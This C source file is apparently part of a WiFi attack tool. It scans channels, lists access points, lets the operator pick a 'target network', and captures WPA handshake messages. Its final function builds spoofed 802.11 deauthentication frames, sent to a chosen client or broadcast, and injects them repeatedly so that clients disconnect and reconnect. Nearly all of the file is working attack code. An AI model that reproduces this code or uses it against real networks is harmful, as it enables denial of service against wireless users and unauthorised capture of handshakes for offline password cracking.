#include "scanner.h"
#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <time.h>

// Default channel list (1-14)
static int default_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14};
static int num_default_channels = 14;

void scanner_init(struct scanner_state *state, struct capture_handle *cap,
                  struct wpa_handshake *handshake, volatile int *running) {
    memset(state, 0, sizeof(*state));
    state->cap = cap;
    state->handshake = handshake;
    state->running = running;
    state->ap_count = 0;
    state->target_found = 0;
}

// Packet callback function
void scanner_packet_callback(const uint8_t *packet, int length, void *user_data) {
    struct scanner_state *state = (struct scanner_state *)user_data;

    if (!state || !state->running || !(*state->running)) {
        return;
    }

    // Parse the packet
    struct parsed_packet pkt = parse_packet(packet, length);
    if (!pkt.valid) {
        return;
    }

    // Check for EAPOL frames (handshake)
    if (pkt.is_eapol) {
        int msg_type = handshake_process_eapol(state->handshake,
                                               pkt.src_mac,
                                               pkt.dst_mac,
                                               packet + length - pkt.raw_len + sizeof(struct radiotap_header),
                                               pkt.raw_len);
        if (msg_type > 0) {
            log_info("Captured WPA Message %d", msg_type);
            handshake_print_status(state->handshake);

            // If we have a target BSSID, check if it matches
            if (state->has_target &&
                memcmp(pkt.bssid, state->target_bssid, 6) == 0) {
                state->target_found = 1;
            }
        }
    }

    // Check for management frames (beacons, probe responses)
    if (pkt.frame_type == WIFI_FRAME_TYPE_MANAGEMENT) {
        if (pkt.frame_subtype == WIFI_SUBTYPE_BEACON ||
            pkt.frame_subtype == WIFI_SUBTYPE_PROBE_RESP) {

            // Add/update AP in list
            scanner_add_ap(state, &pkt);

            // Update handshake SSID if we don't have it yet
            if (strlen(pkt.ssid) > 0 && strlen(state->handshake->ssid) == 0) {
                strncpy(state->handshake->ssid, pkt.ssid, sizeof(state->handshake->ssid) - 1);
                state->handshake->channel = pkt.channel;
            }
        }
    }
}

// Add or update AP in list
int scanner_add_ap(struct scanner_state *state, const struct parsed_packet *pkt) {
    // Check if AP already exists
    for (int i = 0; i < state->ap_count; i++) {
        if (memcmp(state->aps[i].bssid, pkt->bssid, 6) == 0) {
            // Update existing AP
            state->aps[i].beacon_count++;
            state->aps[i].signal_dbm = pkt->signal_dbm;
            state->aps[i].last_seen = time(NULL);

            // Update SSID if we got it
            if (strlen(pkt->ssid) > 0 && strlen(state->aps[i].ssid) == 0) {
                strncpy(state->aps[i].ssid, pkt->ssid, sizeof(state->aps[i].ssid) - 1);
            }

            return 0;
        }
    }

    // Add new AP
    if (state->ap_count < MAX_APS) {
        memcpy(state->aps[state->ap_count].bssid, pkt->bssid, 6);
        strncpy(state->aps[state->ap_count].ssid, pkt->ssid, sizeof(state->aps[0].ssid) - 1);
        state->aps[state->ap_count].channel = pkt->channel;
        state->aps[state->ap_count].signal_dbm = pkt->signal_dbm;
        state->aps[state->ap_count].beacon_count = 1;
        state->aps[state->ap_count].last_seen = time(NULL);
        state->ap_count++;

        return 1; // New AP added
    }

    return -1; // AP list full
}

// Find AP by BSSID
struct ap_info* scanner_find_ap(struct scanner_state *state, const uint8_t *bssid) {
    for (int i = 0; i < state->ap_count; i++) {
        if (memcmp(state->aps[i].bssid, bssid, 6) == 0) {
            return &state->aps[i];
        }
    }
    return NULL;
}

// Print discovered APs
void scanner_print_aps(struct scanner_state *state) {
    if (state->ap_count == 0) {
        log_warning("No access points found yet");
        return;
    }

    printf("\n╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                    Discovered Access Points                  ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  BSSID              Signal  Ch  SSID                         ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");

    for (int i = 0; i < state->ap_count; i++) {
        char bssid_str[18];
        mac_to_str(state->aps[i].bssid, bssid_str);

        printf("║  %-17s  %4d dBm  %2d  %-30s ║\n",
               bssid_str,
               state->aps[i].signal_dbm,
               state->aps[i].channel,
               strlen(state->aps[i].ssid) > 0 ? state->aps[i].ssid : "(hidden)");
    }

    printf("╚════════════════════════════════════════════════════════════════╝\n\n");
}

// Get channel list
void scanner_get_channels(int *channels, int *num_channels) {
    memcpy(channels, default_channels, sizeof(default_channels));
    *num_channels = num_default_channels;
}

// Start scanning
int scanner_start(struct scanner_state *state, int dwell_time_ms) {
    int channels[14];
    int num_channels;

    scanner_get_channels(channels, &num_channels);

    log_info("Starting WiFi scanner...");
    log_info("Scanning %d channels (dwell time: %d ms)", num_channels, dwell_time_ms);
    log_info("Press Ctrl+C to stop\n");

    uint8_t buffer[MAX_PACKET_SIZE];
    int current_channel = 0;
    time_t start_time = time(NULL);

    while (*(state->running)) {
        // Set channel
        if (capture_set_channel(state->cap, channels[current_channel]) < 0) {
            log_error("Failed to set channel %d", channels[current_channel]);
            current_channel = (current_channel + 1) % num_channels;
            continue;
        }

        // Capture packets on this channel
        struct timeval start, now;
        gettimeofday(&start, NULL);

        do {
            int packet_len = capture_packet(state->cap, buffer, sizeof(buffer), 100);
            if (packet_len > 0) {
                scanner_packet_callback(buffer, packet_len, state);
            }
            gettimeofday(&now, NULL);
        } while (((now.tv_sec - start.tv_sec) * 1000 +
                  (now.tv_usec - start.tv_usec) / 1000) < dwell_time_ms);

        // Move to next channel
        current_channel = (current_channel + 1) % num_channels;

        // Print status every 10 seconds
        if (time(NULL) - start_time >= 10) {
            scanner_print_aps(state);
            start_time = time(NULL);
        }
    }

    // Print final results
    scanner_print_aps(state);

    return state->ap_count;
}

// Scan for a fixed duration
int scanner_scan_duration(struct scanner_state *state, int dwell_time_ms, int duration_sec) {
    int channels[14];
    int num_channels;

    scanner_get_channels(channels, &num_channels);

    log_info("Scanning for %d seconds...", duration_sec);

    uint8_t buffer[MAX_PACKET_SIZE];
    int current_channel = 0;
    time_t start_time = time(NULL);
    time_t last_print = time(NULL);

    while (*(state->running) && (time(NULL) - start_time) < duration_sec) {
        if (capture_set_channel(state->cap, channels[current_channel]) < 0) {
            current_channel = (current_channel + 1) % num_channels;
            continue;
        }

        struct timeval tv_start, tv_now;
        gettimeofday(&tv_start, NULL);

        do {
            int packet_len = capture_packet(state->cap, buffer, sizeof(buffer), 100);
            if (packet_len > 0) {
                scanner_packet_callback(buffer, packet_len, state);
            }
            gettimeofday(&tv_now, NULL);
        } while (((tv_now.tv_sec - tv_start.tv_sec) * 1000 +
                  (tv_now.tv_usec - tv_start.tv_usec) / 1000) < dwell_time_ms);

        current_channel = (current_channel + 1) % num_channels;

        if (time(NULL) - last_print >= 3) {
            scanner_print_aps(state);
            last_print = time(NULL);
        }
    }

    scanner_print_aps(state);
    return state->ap_count;
}

// Interactive target selection
int scanner_select_target(struct scanner_state *state) {
    if (state->ap_count == 0) {
        log_warning("No networks found. Try scanning again.");
        return -1;
    }

    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════╗\n");
    printf("║                   SELECT TARGET NETWORK                      ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");
    printf("║  #   BSSID              Signal  Ch  SSID                     ║\n");
    printf("╠════════════════════════════════════════════════════════════════╣\n");

    for (int i = 0; i < state->ap_count; i++) {
        char bssid_str[18];
        mac_to_str(state->aps[i].bssid, bssid_str);

        printf("║  [%d] %-17s  %4d dBm  %2d  %-28s ║\n",
               i + 1,
               bssid_str,
               state->aps[i].signal_dbm,
               state->aps[i].channel,
               strlen(state->aps[i].ssid) > 0 ? state->aps[i].ssid : "(hidden)");
    }

    printf("╚════════════════════════════════════════════════════════════════╝\n\n");

    int choice = -1;
    while (choice < 1 || choice > state->ap_count) {
        printf("  Enter target number (1-%d): ", state->ap_count);
        fflush(stdout);

        if (scanf("%d", &choice) != 1) {
            while (getchar() != '\n');
            choice = -1;
        }

        if (choice < 1 || choice > state->ap_count) {
            log_warning("Invalid choice. Enter a number between 1 and %d", state->ap_count);
        }
    }

    int idx = choice - 1;

    // Set target
    memcpy(state->target_bssid, state->aps[idx].bssid, 6);
    state->has_target = 1;

    char bssid_str[18];
    mac_to_str(state->aps[idx].bssid, bssid_str);
    log_success("Target selected: %s (%s) on channel %d",
                strlen(state->aps[idx].ssid) > 0 ? state->aps[idx].ssid : bssid_str,
                bssid_str,
                state->aps[idx].channel);

    return idx;
}

// Build and send a deauthentication frame
int scanner_send_deauth(struct capture_handle *cap,
                        const uint8_t *target_bssid,
                        const uint8_t *client_mac,
                        int count) {
    // Create a separate socket for injection
    int inject_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (inject_fd < 0) {
        log_error("Failed to create injection socket");
        return -1;
    }

    // Get interface index
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, cap->iface, IFNAMSIZ - 1);
    if (ioctl(inject_fd, SIOCGIFINDEX, &ifr) < 0) {
        log_error("Failed to get interface index for injection");
        close(inject_fd);
        return -1;
    }
    int ifindex = ifr.ifr_ifindex;

    // Set up address for sending
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = ifindex;
    addr.sll_halen = 6;
    memcpy(addr.sll_addr, target_bssid, 6);

    // Deauth frame
    uint8_t deauth_frame[26];
    memset(deauth_frame, 0, sizeof(deauth_frame));

    // Frame Control: Deauthentication (0xC0 0x00 = little-endian for 0x00C0)
    deauth_frame[0] = 0xC0;
    deauth_frame[1] = 0x00;

    // Duration
    deauth_frame[2] = 0x00;
    deauth_frame[3] = 0x00;

    // Address 1: Client or broadcast
    if (client_mac) {
        memcpy(deauth_frame + 4, client_mac, 6);
    } else {
        memset(deauth_frame + 4, 0xFF, 6); // Broadcast
    }

    // Address 2: AP MAC (source)
    memcpy(deauth_frame + 10, target_bssid, 6);

    // Address 3: AP MAC (BSSID)
    memcpy(deauth_frame + 16, target_bssid, 6);

    // Sequence Control
    deauth_frame[22] = 0x00;
    deauth_frame[23] = 0x00;

    // Reason Code: 7 (Class 3 frame from non-associated station)
    deauth_frame[24] = 0x07;
    deauth_frame[25] = 0x00;

    int sent = 0;
    for (int i = 0; i < count; i++) {
        ssize_t ret = sendto(inject_fd, deauth_frame, sizeof(deauth_frame), 0,
                             (struct sockaddr *)&addr, sizeof(addr));
        if (ret > 0) {
            sent++;
        }

        usleep(10000); // 10ms between packets
    }

    close(inject_fd);
    return sent;
}
